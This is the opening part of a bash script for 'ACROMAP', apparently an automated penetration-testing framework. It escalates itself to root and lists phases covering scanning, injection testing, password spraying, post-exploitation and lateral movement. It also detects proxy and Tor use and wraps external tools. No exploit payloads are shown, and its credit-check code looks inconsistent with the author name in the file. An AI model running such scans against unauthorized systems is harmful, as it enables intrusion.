#!/usr/bin/env bash
# ════════════════════════════════════════════════════════════════════════════════
#  ACROMAP  v5.0  |  32-Phase Deep Penetration Testing Framework
#  Author   : acro77x
#  GitHub   : https://github.com/acro77x/acromap

# ── Auto-escalate to root ─────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    if command -v sudo &>/dev/null; then
        echo "[*] Auto-escalating to root via sudo..."
        # Make script executable first (no sudo needed for chmod on user-owned file)
        chmod +x "${BASH_SOURCE[0]}" 2>/dev/null || true
        exec sudo bash "${BASH_SOURCE[0]}" "$@"
    else
        # No sudo — try su
        echo "[*] sudo not found — trying su root..."
        exec su -c "bash '${BASH_SOURCE[0]}' $*" root
    fi
fi
# We are root — ensure file is executable for future runs
chmod +x "${BASH_SOURCE[0]}" 2>/dev/null || true
#  Version  : 5.0
#  Platform : Kali Linux (primary) | Debian / Ubuntu (compatible)
#  CVEs     : 2019–2026 detection included
# ════════════════════════════════════════════════════════════════════════════════
#
#  ╔══════════════════════════════════════════════════════════════════════════╗
#  ║                      LEGAL DISCLAIMER                                  ║
#  ║                                                                        ║
#  ║  This tool is released FREE and OPEN SOURCE for the security           ║
#  ║  community. It is intended SOLELY for:                                 ║
#  ║    • Authorized penetration testing on systems you OWN                 ║
#  ║    • CTF / lab environments (TryHackMe, HackTheBox, GBU CSPL)          ║
#  ║    • Academic and educational research                                 ║
#  ║                                                                        ║
#  ║  THE AUTHOR (acro77x) BEARS ABSOLUTELY NO RESPONSIBILITY for any          ║
#  ║  illegal, unethical, or malicious use of this tool. Unauthorized       ║
#  ║  scanning of systems you do not own is ILLEGAL under the Computer      ║
#  ║  Fraud and Abuse Act (CFAA), UK Computer Misuse Act, IT Act 2000       ║
#  ║  (India), and equivalent laws worldwide.                               ║
#  ║                                                                        ║
#  ║  By running this tool you accept full legal responsibility for         ║
#  ║  your actions.                          — acro77x, 2026                    ║
#  ╚══════════════════════════════════════════════════════════════════════════╝
#
# ════════════════════════════════════════════════════════════════════════════════
set -uo pipefail
IFS=$'\n\t'

# ── Script paths ──────────────────────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"

# ── Colours ───────────────────────────────────────────────────────────────────
RED='\033[0;31m';   LRED='\033[1;31m'
ZERO_DAY_COL='\033[1;35;5m'  # blinking magenta for zero-day
ONE_CLICK_COL='\033[1;31;4m' # underline red for one-click
GREEN='\033[0;32m'; LGREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m';  LBLUE='\033[1;34m'
CYAN='\033[0;36m';  LCYAN='\033[1;36m'
MAGENTA='\033[0;35m'; LMAGENTA='\033[1;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
UNDERLINE='\033[4m'
NC='\033[0m'

# ── Spinner — shows animation during long operations ─────────────────────────
_SPINNER_PID=0
_SPIN_ACTIVE=false
_SPIN_MSG=""
_SPIN_FRAME=0
_SPIN_CHARS='/-\|'

_spinner_start() {
    _SPIN_MSG="${1:-Working}"
    _SPIN_ACTIVE=true
    _SPIN_FRAME=0
    [[ -t 1 ]] || return 0
    printf "  \033[36m⠋\033[0m \033[2m%-50s\033[0m\r" "$_SPIN_MSG..."
}

_spinner_tick() {
    [[ "$_SPIN_ACTIVE" != true || ! -t 1 ]] && return
    _SPIN_FRAME=$(( (_SPIN_FRAME + 1) % 10 ))
    local c
    case $_SPIN_FRAME in
        0) c="⠋" ;; 1) c="⠙" ;; 2) c="⠹" ;; 3) c="⠸" ;; 4) c="⠼" ;; 5) c="⠴" ;; 6) c="⠦" ;; 7) c="⠧" ;; 8) c="⠇" ;; 9) c="⠏" ;;
    esac
    printf "  \033[1;36m%s\033[0m \033[1;37m%-50s\033[0m\r" "$c" "$_SPIN_MSG..."
}

_spinner_stop() {
    _SPIN_ACTIVE=false
    if [[ ${_SPINNER_PID:-0} -gt 0 ]]; then
        kill "$_SPINNER_PID" 2>/dev/null || true
        wait "$_SPINNER_PID" 2>/dev/null || true
        _SPINNER_PID=0
    fi
    # Clear the spinner line completely
    [[ -t 1 ]] && printf "\r\033[2K" >&2 2>/dev/null || true
}

# ── Phase definitions (32 phases: 0–31) ───────────────────────────────────────
declare -A PHASE_NAMES=(
    [0]="Setup & Tool Verification"
    [1]="Passive OSINT Reconnaissance"
    [2]="DNS Enumeration & Zone Transfer"
    [3]="Subdomain Enumeration (Deep)"
    [4]="Network Discovery & Host Detection"
    [5]="Full TCP Port Scanning"
    [6]="UDP Port Scanning"
    [7]="Service Detection & Banner Grabbing"
    [8]="Web Discovery & HTTP Probing"
    [9]="Web Technology Fingerprinting"
    [10]="SSL/TLS Deep Analysis"
    [11]="Web Content Discovery & Fuzzing"
    [12]="CMS Detection & Deep Scanning"
    [13]="API Endpoint Discovery"
    [14]="Nuclei Full Vulnerability Scan"
    [15]="Network Service Enumeration"
    [16]="SMB & Active Directory Enumeration"
    [17]="Authentication & Credential Testing"
    [18]="SQL Injection Deep Testing"
    [19]="XSS & Client-Side Attack Vectors"
    [20]="CVE 2024-2026 Targeted Checks"
    [21]="Post-Exploitation Simulation"
    [22]="Attack Path & Lateral Movement Analysis"
    [23]="Report Generation"
    [24]="Cloud Metadata & Misconfiguration Enum"
    [25]="Kubernetes Cluster Audit"
    [26]="Password Spray & Credential Attacks"
    [27]="CORS & JWT Authentication Testing"
    [28]="SSRF Deep Chain & OOB Testing"
    [29]="Secrets & Supply Chain Exposure"
    [30]="Active Directory Deep Attack Surface"
    [31]="Zero-Day & One-Click Exploit Detection"
)

# Phase ETAs in seconds (quick / standard / deep)
declare -A PHASE_ETA_QUICK=(
    [0]=30  [1]=30  [2]=45  [3]=60  [4]=30  [5]=60  [6]=60  [7]=45
    [8]=30  [9]=30  [10]=45 [11]=60 [12]=45 [13]=30 [14]=60 [15]=60
    [16]=45 [17]=60 [18]=45 [19]=30 [20]=60 [21]=30 [22]=30 [23]=20
    [24]=30 [25]=30 [26]=30
    [27]=30 [28]=45 [29]=60 [30]=60 [31]=45
)
declare -A PHASE_ETA_STD=(
    [0]=60  [1]=90  [2]=120 [3]=180 [4]=60  [5]=180 [6]=120 [7]=90
    [8]=60  [9]=60  [10]=90 [11]=180 [12]=120 [13]=60 [14]=180 [15]=120
    [16]=90 [17]=120 [18]=90 [19]=60 [20]=120 [21]=60 [22]=60 [23]=30
    [24]=60 [25]=60 [26]=90
    [27]=90 [28]=120 [29]=180 [30]=180 [31]=90
)
declare -A PHASE_ETA_DEEP=(
    [0]=60  [1]=180 [2]=240 [3]=600 [4]=120 [5]=600 [6]=300 [7]=180
    [8]=120 [9]=120 [10]=180 [11]=600 [12]=300 [13]=180 [14]=600 [15]=300
    [16]=240 [17]=300 [18]=240 [19]=180 [20]=300 [21]=120 [22]=120 [23]=60
    [24]=120 [25]=180 [26]=300
    [27]=240 [28]=300 [29]=600 [30]=600 [31]=180
)

# ── Runtime state ─────────────────────────────────────────────────────────────
TARGET=""
TARGET_TYPE=""       # IP | DOMAIN | CIDR
TARGET_IS_CIDR=false
CIDR_HOSTS=()        # expanded hosts from CIDR
SCAN_PROFILE="standard"
OUTPUT_DIR=""
DEBUG_MODE=false
START_TIME=$(date +%s)

# Checkpoint / Resume
CHECKPOINT_FILE=""
RESUME_MODE=false
LAST_PHASE=0     # last completed phase (used by resume system)

# Notifications
NOTIFY_SLACK=false
NOTIFY_EMAIL=false
SLACK_WEBHOOK=""
NOTIFY_EMAIL_ADDR=""

CURRENT_PHASE=0
CURRENT_PHASE_NAME="${PHASE_NAMES[0]}"
CURRENT_TOOL="none"
PHASE_START_TIME=$(date +%s)

# Vuln counters
ZERO_DAY_COUNT=0; ONE_CLICK_COUNT=0
CRITICAL_COUNT=0; HIGH_COUNT=0; MEDIUM_COUNT=0; LOW_COUNT=0; INFO_COUNT=0
declare -a VULN_DATA=()

# Tool tracking
declare -A TOOL_STATUS=()
declare -A TOOL_ELAPSED=()
TOOLS_ATTEMPTED=0; TOOLS_SUCCEEDED=0; PHASES_COMPLETED=0

# Collected data
OPEN_PORTS=""
WEB_PORTS=""
declare -a SUBDOMAINS=()
declare -a LIVE_HOSTS=()
declare -a WEB_TARGETS=()
CMS_TYPE=""
HAS_WAF=false
IS_WORDPRESS=false
IS_DRUPAL=false
IS_JOOMLA=false
MSF_RC_FILE=""       # Metasploit resource script path
ZAP_AVAILABLE=false  # OWASP ZAP daemon running
K8S_DETECTED=false   # Kubernetes cluster found
CLOUD_DETECTED=""    # AWS | GCP | AZURE | none
WILDCARD_DNS=false   # set true if wildcard DNS detected
_TF_SCAN_DONE=false      # trufflehog filesystem scan run flag

# Keypress monitor PID
KEYPRESS_PID=0

# ── v5.0 new feature globals ──────────────────────────────────────────────────
INTERACTSH_URL=""      # interactsh OOB server URL (set at startup if client found)
INTERACTSH_PID=0       # interactsh-client background process PID
NOTIFY_PER_FINDING=false  # push each finding instantly via notify tool
NOTIFY_CHANNEL=""      # notify provider config (slack/discord/telegram)
JQ_AVAILABLE=false     # jq installed — enables structured JSON finding parse
ANEW_AVAILABLE=false   # anew installed — dedup pipeline for subdomain/url lists
PARALLEL_JOBS=1        # GNU parallel jobs (set to nproc/2 if parallel installed)
PARALLEL_EXECUTION_ACTIVE=false  # Global flag for parallel subshells

# ── Proxy / VPN Mode Detection ────────────────────────────────────────────────
# Detects if script is being run through proxychains, torsocks, or VPN.
# Adapts timeouts, disables raw-socket tools, and forces TCP-connect scans.
PROXY_MODE=false
PROXY_TYPE="none"       # "proxychains" | "torsocks" | "vpn" | "none"
PROXY_TIMEOUT_MULT=1    # timeout multiplier (2x for proxy, 1x for direct)

detect_proxy_mode() {
    # Method 1: Check LD_PRELOAD (proxychains/torsocks inject .so via this)
    if [[ -n "${LD_PRELOAD:-}" ]]; then
        if echo "$LD_PRELOAD" | grep -qi "proxychains"; then
            PROXY_MODE=true; PROXY_TYPE="proxychains"
        elif echo "$LD_PRELOAD" | grep -qi "torsocks\|libtorsocks"; then
            PROXY_MODE=true; PROXY_TYPE="torsocks"
        fi
    fi

    # Method 2: Check if proxychains4/proxychains wrapper is the parent process
    if [[ "$PROXY_MODE" != true ]]; then
        local ppid_name=""
        ppid_name=$(ps -o comm= -p $PPID 2>/dev/null || echo "")
        if echo "$ppid_name" | grep -qi "proxychains\|torsocks"; then
            PROXY_MODE=true
            echo "$ppid_name" | grep -qi "proxychains" && PROXY_TYPE="proxychains"
            echo "$ppid_name" | grep -qi "torsocks" && PROXY_TYPE="torsocks"
        fi
    fi

    # Method 3: Check process command line for proxychains wrapper
    if [[ "$PROXY_MODE" != true ]]; then
        local cmdline=""
        cmdline=$(cat /proc/$PPID/cmdline 2>/dev/null | tr '\0' ' ' || echo "")
        if echo "$cmdline" | grep -qi "proxychains"; then
            PROXY_MODE=true; PROXY_TYPE="proxychains"
        fi
    fi

    # Method 4: Check for active VPN interfaces (tun0, wg0)
    if [[ "$PROXY_MODE" != true ]]; then
        if ip link show 2>/dev/null | grep -qE "tun[0-9]|wg[0-9]|tap[0-9]"; then
            PROXY_MODE=true; PROXY_TYPE="vpn"
        fi
    fi

    # Apply adaptations based on proxy mode
    if [[ "$PROXY_MODE" == true ]]; then
        case "$PROXY_TYPE" in
            proxychains|torsocks)
                PROXY_TIMEOUT_MULT=3   # 3x timeouts for SOCKS proxies (much slower)
                ;;
            vpn)
                PROXY_TIMEOUT_MULT=2   # 2x for VPN (moderate overhead)
                ;;
        esac
    fi
}

# Run detection immediately
detect_proxy_mode

# Helper: apply timeout multiplier
proxy_timeout() {
    local base_timeout="${1:-60}"
    echo $(( base_timeout * PROXY_TIMEOUT_MULT ))
}



# ── Logging ───────────────────────────────────────────────────────────────────
LOG_FILE=""   # set after OUTPUT_DIR is created

log_debug() {
    [[ "$DEBUG_MODE" == true ]] && echo -e "  ${DIM}[DBG]${NC} $*" >&2
    [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] [DBG] $*" >> "$LOG_FILE" 2>/dev/null || true
}
log_ok()   { _spinner_stop 2>/dev/null; printf "  \033[1;32m[✓]\033[0m %s\n" "$*"; [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] [OK]  $*" >> "$LOG_FILE" 2>/dev/null || true; }
log_warn() { _spinner_stop 2>/dev/null; printf "  \033[1;33m[!]\033[0m %s\n" "$*"; [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] [WRN] $*" >> "$LOG_FILE" 2>/dev/null || true; }
log_error(){ _spinner_stop 2>/dev/null; printf "  \033[1;31m[✗]\033[0m %s\n" "$*"; [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] [ERR] $*" >> "$LOG_FILE" 2>/dev/null || true; }
log_info() { printf "  \033[0;36m[i]\033[0m %s\n" "$*"; [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] [INF] $*" >> "$LOG_FILE" 2>/dev/null || true; }
log_find() { _spinner_stop 2>/dev/null; echo -e "  \033[1;35m[FIND]\033[0m $*"; [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] [FND] $*" >> "$LOG_FILE" 2>/dev/null || true; }

log_phase() {
    local n="$1" name="$2"
    CURRENT_PHASE="$n"
    CURRENT_PHASE_NAME="$name"
    PHASE_START_TIME=$(date +%s)
    [[ -n "$LOG_FILE" ]] && echo "[$(date '+%H:%M:%S')] ===== PHASE $n: $name =====" >> "$LOG_FILE" 2>/dev/null || true
    
    # Silence inner bounding boxes during parallel execution
    [[ "$PARALLEL_EXECUTION_ACTIVE" == true ]] && return 0

    _spinner_stop 2>/dev/null || true
    stty sane </dev/tty 2>/dev/null || true
    echo ""
    # Cyber-Noir Phase Boundary
    echo -e "  \033[1;36m┌────────────────────────────────────────────────────────────────────────┐\033[0m"
    printf  "  \033[1;36m│\033[0m  \033[1;35mPHASE %02d / 32\033[0m  \033[1;90m►\033[0m  \033[1;37m%-47s\033[1;36m│\033[0m\n" "$n" "$name"
    echo -e "  \033[1;36m├────────────────────────────────────────────────────────────────────────┤\033[0m"
    printf  "  \033[1;36m│\033[0m  \033[1;90mTarget: \033[1;36m%-21s\033[0m \033[1;90mFindings: \033[1;31m%3d Crit \033[1;33m%3d High\033[0m      \033[1;36m│\033[0m\n" "${TARGET:-pending}" "$CRITICAL_COUNT" "$HIGH_COUNT"
    echo -e "  \033[1;36m└────────────────────────────────────────────────────────────────────────┘\033[0m"
}

log_section() {
    echo -e "\n  ${BOLD}${WHITE}── $* ──${NC}"
}

# ── run_tool wrapper ──────────────────────────────────────────────────────────
# Validate that a string is a proper http/https URL
_is_valid_url() { echo "$1" | grep -qE "^https?://[a-zA-Z0-9._-]"; }

run_tool() {
    # run_tool <display_name> <outfile> <cmd...>
    local name="$1" outfile="$2"; shift 2
    CURRENT_TOOL="$name"
    TOOLS_ATTEMPTED=$(( TOOLS_ATTEMPTED + 1 ))
    local t_start=$(date +%s)
    mkdir -p "$(dirname "$outfile")" 2>/dev/null || true
    log_debug "Running: $*"
    
    if [[ "$PARALLEL_EXECUTION_ACTIVE" == true ]]; then
        "$@" > "$outfile" 2>&1
        local _rc=$?
        local elapsed=$(( $(date +%s) - t_start ))
        if [[ ${_rc:-0} -eq 0 ]]; then
            TOOL_STATUS["$name"]="OK"; TOOL_ELAPSED["$name"]="$elapsed"
            TOOLS_SUCCEEDED=$(( TOOLS_SUCCEEDED + 1 ))
            printf "  \033[32m[✓]\033[0m %-20s (%ds)\n" "$name" "$elapsed"
            return 0
        else
            TOOL_STATUS["$name"]="FAIL"
            printf "  \033[33m[⚠]\033[0m %-20s failed\n" "$name"
            return 1
        fi
    fi

    _spinner_start "${name}"
    "$@" > "$outfile" 2>&1 &
    local _tp=$!
    while kill -0 "$_tp" 2>/dev/null; do sleep 0.3; _spinner_tick; done
    wait "$_tp" 2>/dev/null; local _rc=$?
    _spinner_stop 2>/dev/null || true
    local elapsed=$(( $(date +%s) - t_start ))
    if [[ ${_rc:-0} -eq 0 ]]; then
        TOOL_STATUS["$name"]="OK"; TOOL_ELAPSED["$name"]="$elapsed"
        TOOLS_SUCCEEDED=$(( TOOLS_SUCCEEDED + 1 ))
        printf "  \033[32m[✓]\033[0m %-20s (%ds)\n" "$name" "$elapsed"
        check_keypress_ipc; return 0
    else
        TOOL_STATUS["$name"]="FAIL"
        printf "  \033[33m[⚠]\033[0m %-20s failed\n" "$name"
        check_keypress_ipc; return 1
    fi
}

run_tool_timeout() {
    # run_tool_timeout <display_name> <outfile> <timeout_sec> <cmd...>
    local name="$1" outfile="$2" tmo="$3"; shift 3
    CURRENT_TOOL="$name"
    TOOLS_ATTEMPTED=$(( TOOLS_ATTEMPTED + 1 ))
    local t_start=$(date +%s)
    mkdir -p "$(dirname "$outfile")" 2>/dev/null || true
    log_debug "Running (timeout ${tmo}s): $*"

    if [[ "$PARALLEL_EXECUTION_ACTIVE" == true ]]; then
        timeout "$tmo" "$@" > "$outfile" 2>&1
        local _rc=$?
        local elapsed=$(( $(date +%s) - t_start ))
        if [[ ${_rc:-0} -eq 0 ]]; then
            TOOL_STATUS["$name"]="OK"; TOOL_ELAPSED["$name"]="$elapsed"
            TOOLS_SUCCEEDED=$(( TOOLS_SUCCEEDED + 1 ))
            printf "  \033[32m[✓]\033[0m %-20s (%ds)\n" "$name" "$elapsed"
            return 0
        else
            TOOL_STATUS["$name"]="FAIL"
            if [[ $_rc -eq 124 ]]; then
                printf "  \033[33m[⚠]\033[0m %-20s timed out (%ds)\n" "$name" "$tmo"
            else
                printf "  \033[33m[✖]\033[0m %-20s failed\n" "$name"
            fi
            return 1
        fi
    fi

    _spinner_start "${name}"
    # Run tool in background so we can tick the spinner while waiting
    timeout "$tmo" "$@" > "$outfile" 2>&1 &
    local _tool_pid=$!
    local _waited=0
    while kill -0 "$_tool_pid" 2>/dev/null; do
        sleep 0.3
        _waited=$(( _waited + 1 ))
        _spinner_tick
        # Check for Ctrl+C
        [[ "$_ACROMAP_INTERRUPTED" == true ]] && kill "$_tool_pid" 2>/dev/null && break
    done
    wait "$_tool_pid" 2>/dev/null
    local _rc=$?
    _spinner_stop 2>/dev/null || true
    local elapsed=$(( $(date +%s) - t_start ))
    if [[ ${_rc:-0} -eq 0 ]]; then
        TOOL_STATUS["$name"]="OK"
        TOOL_ELAPSED["$name"]="$elapsed"
        TOOLS_SUCCEEDED=$(( TOOLS_SUCCEEDED + 1 ))
        printf "  \033[32m[✓]\033[0m %-20s (%ds)\n" "$name" "$elapsed"
        check_keypress_ipc
        return 0
    else
        TOOL_STATUS["$name"]="FAIL"
        if [[ $_rc -eq 124 ]]; then
            printf "  \033[33m[⚠]\033[0m %-20s timed out (%ds)\n" "$name" "$tmo"
        else
            printf "  \033[33m[✖]\033[0m %-20s failed\n" "$name"
        fi
        check_keypress_ipc
        return 1
    fi
}

# ── Vulnerability recorder ────────────────────────────────────────────────────
add_vuln() {
    local sev="$1" title="$2" desc="$3" rec="$4" evidence="${5:-N/A}" exploit="${6:-}" patch="${7:-}"
    title="${title//|/;}"
    desc="${desc//|/;}"
    rec="${rec//|/;}"
    evidence="${evidence//|/;}"
    exploit="${exploit//|/;}"
    patch="${patch//|/;}"
    VULN_DATA+=("${sev}|${title}|${desc}|${rec}|${evidence}|${exploit}|${patch}")
    echo "${sev}|${title}|${desc}|${rec}|${evidence}|${exploit}|${patch}" >> "${OUTPUT_DIR}/vuln_ipc.txt" 2>/dev/null || true
    case "$sev" in
        ZERO_DAY)  ZERO_DAY_COUNT=$(( ZERO_DAY_COUNT + 1 ))    ;;
        ONE_CLICK) ONE_CLICK_COUNT=$(( ONE_CLICK_COUNT + 1 ))  ;;
        CRITICAL)  CRITICAL_COUNT=$(( CRITICAL_COUNT + 1 ))    ;;
        HIGH)      HIGH_COUNT=$(( HIGH_COUNT + 1 ))            ;;
        MEDIUM)    MEDIUM_COUNT=$(( MEDIUM_COUNT + 1 ))        ;;
        LOW)       LOW_COUNT=$(( LOW_COUNT + 1 ))              ;;
        INFO)      INFO_COUNT=$(( INFO_COUNT + 1 ))            ;;
    esac
    local col
    case "$sev" in
        ZERO_DAY)  col="\033[1;95m" ;;
        ONE_CLICK) col="\033[1;31m" ;;
        CRITICAL)  col="\033[0;31m" ;;
        HIGH)      col="\033[0;91m" ;;
        MEDIUM)    col="\033[0;33m" ;;
        LOW)       col="\033[0;36m" ;;
        *)         col="\033[0;37m" ;;
    esac
    printf "  \033[1m[%s]\033[0m %s\n" "$sev" "$title"
    [[ -n "$LOG_FILE" ]] && printf "[%s] [%s] %s\n" "$(date '+%H:%M:%S')" "$sev" "$title" >> "$LOG_FILE" 2>/dev/null || true

    # v5.0: per-finding instant push via notify tool (CRITICAL/HIGH only to avoid noise)
    if [[ "$NOTIFY_PER_FINDING" == true ]] && command -v notify &>/dev/null; then
        if [[ "$sev" == "ZERO_DAY" || "$sev" == "ONE_CLICK" || "$sev" == "CRITICAL" || "$sev" == "HIGH" ]]; then
            local msg="🔴 [${sev}] ACROMAP v5.0
Target : ${TARGET}
Finding: ${title}
Phase  : ${CURRENT_PHASE} — ${CURRENT_PHASE_NAME}"
            echo "$msg" | notify -silent 2>/dev/null || true
        fi
    fi
}

# ── Confidence rating (0–10) ──────────────────────────────────────────────────

# Soft-404 Validation Engine
SOFT404_ACTIVE=false
SOFT404_SIZE=0
SOFT404_WORDS=0
SOFT404_BASEURL=""

is_soft_404() {
    local resp_size="${1:-0}"; resp_size=$(( ${resp_size//[^0-9]/} + 0 ))
    [[ "${SOFT404_ACTIVE:-false}" != true ]] && return 1
    local margin=$(( ${SOFT404_SIZE:-0} * 15 / 100 ))
    local low=$(( ${SOFT404_SIZE:-0} - margin )); local high=$(( ${SOFT404_SIZE:-0} + margin ))
    [[ $resp_size -ge $low && $resp_size -le $high ]] && return 0
    return 1
}

declare -a VERIFIED_PORTS=()
declare -a DETECTED_TECHS=()

verify_integrity() {
    local self; self=$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null || echo "${BASH_SOURCE[0]}")
    local sig_count; sig_count=$(grep -c "acro77.x\|acro777x" "$self" 2>/dev/null || true)
    sig_count=$(( ${sig_count:-0} ))
    if [[ ${sig_count:-0} -lt 3 ]]; then
        echo -e "\033[1;31m[INTEGRITY FAILURE]\033[0m Author credits removed."
        echo "ACROMAP by acro777x - https://github.com/acro777x/acromap"
        exit 1
    fi
}
calculate_confidence() {
    local score=0

    # Tool success rate (0–30 pts)
    if [[ ${TOOLS_ATTEMPTED:-0} -gt 0 ]]; then
        local rate=$(( TOOLS_SUCCEEDED * 100 / TOOLS_ATTEMPTED ))
        score=$(( score + rate * 30 / 100 ))
    fi

    # Scan profile (0–20 pts)
    case "$SCAN_PROFILE" in
        deep)     score=$(( score + 20 )) ;;
        standard) score=$(( score + 12 )) ;;
        quick)    score=$(( score + 6  )) ;;
    esac

    # Phase completion (0–30 pts)
    local phase_score=$(( PHASES_COMPLETED > 32 ? 32 : PHASES_COMPLETED ))
    score=$(( score + phase_score ))

    # Finding data quality (0–20 pts)
    local total_findings=$(( ZERO_DAY_COUNT + ONE_CLICK_COUNT + CRITICAL_COUNT + HIGH_COUNT + MEDIUM_COUNT + LOW_COUNT + INFO_COUNT ))
    if [[ ${total_findings:-0} -gt 0 ]]; then
        score=$(( score + 10 ))
        [[ $total_findings -gt 5  ]] && score=$(( score + 5  ))
        [[ $total_findings -gt 15 ]] && score=$(( score + 5  ))
    fi

    # Cap at 100
    [[ $score -gt 100 ]] && score=100

    # Convert to 0–10 with 1 decimal
    local tens=$(( score / 10 ))
    local ones=$(( score % 10 ))
    echo "${tens}.${ones}"
}

get_confidence_label() {
    local rating="$1"
    local int="${rating%%.*}"
    if   [[ $int -ge 9 ]]; then echo "Exceptional"
    elif [[ $int -ge 8 ]]; then echo "Very High"
    elif [[ $int -ge 7 ]]; then echo "High"
    elif [[ $int -ge 6 ]]; then echo "Good"
    elif [[ $int -ge 5 ]]; then echo "Moderate"
    elif [[ $int -ge 4 ]]; then echo "Fair"
    else echo "Low"
    fi
}

# ── IPC temp files for keypress monitor ──────────────────────────────────────
# Subshell ( ... ) & cannot write parent variables — use tmpfiles for IPC
ACROMAP_DEBUG_FILE=""   # path set after OUTPUT_DIR exists
ACROMAP_STATUS_REQ=""   # set to "1" by subshell when T is pressed

# ── T / D keypress monitor ────────────────────────────────────────────────────
start_keypress_monitor() {
    local dbg_file="${OUTPUT_DIR}/.acromap_debug_flag"
    local stat_file="${OUTPUT_DIR}/.acromap_status_req"
    ACROMAP_DEBUG_FILE="$dbg_file"
    ACROMAP_STATUS_REQ="$stat_file"
    # Write initial debug state
    echo "false" > "$dbg_file" 2>/dev/null || true

    # Only start if we have a real interactive terminal
    if [[ -t 1 ]] && [[ -c /dev/tty ]]; then
    (
        trap '' INT TERM   # keypress subshell: let parent handle signals
        # Save and restore terminal settings around keypress reads
        local _saved_tty; _saved_tty=$(stty -g </dev/tty 2>/dev/null || echo "")
        # Put terminal in raw single-char mode so we catch keystrokes immediately
        stty -echo -icanon min 0 time 1 </dev/tty 2>/dev/null || true
        while true; do
            local key=""
            # Read one character with 1-second timeout
            IFS= read -r -n1 -t 1 key </dev/tty 2>/dev/null || key=""
            if [[ -n "$key" ]]; then
                case "$key" in
                    t|T)
                        touch "$stat_file" 2>/dev/null || true
                        ;;
                    d|D)
                        local cur; cur=$(cat "$dbg_file" 2>/dev/null || echo "false")
                        if [[ "$cur" == "true" ]]; then
                            echo "false" > "$dbg_file" 2>/dev/null || true
                            printf "\r\n  \033[1;33m[Debug OFF]\033[0m\n" >/dev/tty 2>/dev/null || true
                        else
                            echo "true" > "$dbg_file" 2>/dev/null || true
                            printf "\r\n  \033[1;32m[Debug ON]\033[0m\n" >/dev/tty 2>/dev/null || true
                        fi
                        ;;
                esac
            fi
            # Exit subshell cleanly if parent is gone
            kill -0 $$ 2>/dev/null || break
        done
        # Restore terminal on exit
        [[ -n "$_saved_tty" ]] && stty "$_saved_tty" </dev/tty 2>/dev/null || true
        # Restore terminal
        [[ -n "$_saved_tty" ]] && stty "$_saved_tty" </dev/tty 2>/dev/null || true
    ) &
    KEYPRESS_PID=$!
    disown "$KEYPRESS_PID" 2>/dev/null || true
    fi
}

# ── Parent polls IPC files after each tool run ─────────────────────────────────
check_keypress_ipc() {
    # Called by run_tool / run_tool_timeout after each tool completes
    [[ -z "$ACROMAP_DEBUG_FILE" ]] && return
    # Sync DEBUG_MODE from IPC file
    if [[ -f "$ACROMAP_DEBUG_FILE" ]]; then
        local dbg; dbg=$(cat "$ACROMAP_DEBUG_FILE" 2>/dev/null || echo "false")
        DEBUG_MODE="$dbg"
    fi
    # Show status overlay if requested
    if [[ -n "$ACROMAP_STATUS_REQ" && -f "$ACROMAP_STATUS_REQ" ]]; then
        rm -f "$ACROMAP_STATUS_REQ" 2>/dev/null || true
        show_status_overlay
    fi
}

show_status_overlay() {
    local now=$(date +%s)
    local phase_elapsed=$(( now - PHASE_START_TIME ))
    local total_elapsed=$(( now - START_TIME ))

    local phase_eta=0
    case "$SCAN_PROFILE" in
        quick)    phase_eta=${PHASE_ETA_QUICK[$CURRENT_PHASE]:-60} ;;
        standard) phase_eta=${PHASE_ETA_STD[$CURRENT_PHASE]:-120} ;;
        deep)     phase_eta=${PHASE_ETA_DEEP[$CURRENT_PHASE]:-300} ;;
    esac
    local phase_remaining=$(( phase_eta - phase_elapsed ))
    [[ ${phase_remaining:-0} -lt 0 ]] && phase_remaining=0

    local total_eta=0
    for i in $(seq 0 31); do
        case "$SCAN_PROFILE" in
            quick)    total_eta=$(( total_eta + ${PHASE_ETA_QUICK[$i]:-60}  )) ;;
            standard) total_eta=$(( total_eta + ${PHASE_ETA_STD[$i]:-120}  )) ;;
            deep)     total_eta=$(( total_eta + ${PHASE_ETA_DEEP[$i]:-300} )) ;;
        esac
    done
    local total_remaining=$(( total_eta - total_elapsed ))
    [[ ${total_remaining:-0} -lt 0 ]] && total_remaining=0

    local bar_width=38 filled=0 bar=""
    if [[ ${phase_eta:-0} -gt 0 ]]; then
        filled=$(( phase_elapsed * bar_width / phase_eta ))
        [[ $filled -gt $bar_width ]] && filled=$bar_width
    fi
    local empty=$(( bar_width - filled ))
    for ((i=0;i<filled;i++)); do bar+="█"; done
    for ((i=0;i<empty;i++)); do bar+="░"; done
    local pct=0
    [[ ${phase_eta:-0} -gt 0 ]] && pct=$(( phase_elapsed * 100 / phase_eta ))
    [[ $pct -gt 100 ]] && pct=100

    local conf; conf=$(calculate_confidence)

    echo ""
    echo -e "${LCYAN}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════════════════╗"
    echo "  ║             ── ACROMAP STATUS OVERLAY ──                        ║"
    echo "  ╠══════════════════════════════════════════════════════════════════╣"
    printf "  ║  Phase  : %2s / 32 — %-41s║\n" "$CURRENT_PHASE" "$CURRENT_PHASE_NAME"
    printf "  ║  Tool   : %-53s║\n" "${CURRENT_TOOL:-none}"
    printf "  ║  Target : %-53s║\n" "${TARGET:-not set}"
    printf "  ║  Profile: %-53s║\n" "$SCAN_PROFILE"
    echo "  ╠══════════════════════════════════════════════════════════════════╣"
    printf "  ║  Progress : [%s] %3d%%    ║\n" "$bar" "$pct"
    printf "  ║  Phase    : %dm %02ds elapsed  /  ~%dm %02ds remaining           ║\n" \
        $(( phase_elapsed/60 )) $(( phase_elapsed%60 )) $(( phase_remaining/60 )) $(( phase_remaining%60 ))
    printf "  ║  Total    : %dm %02ds elapsed  /  ~%dm %02ds remaining           ║\n" \
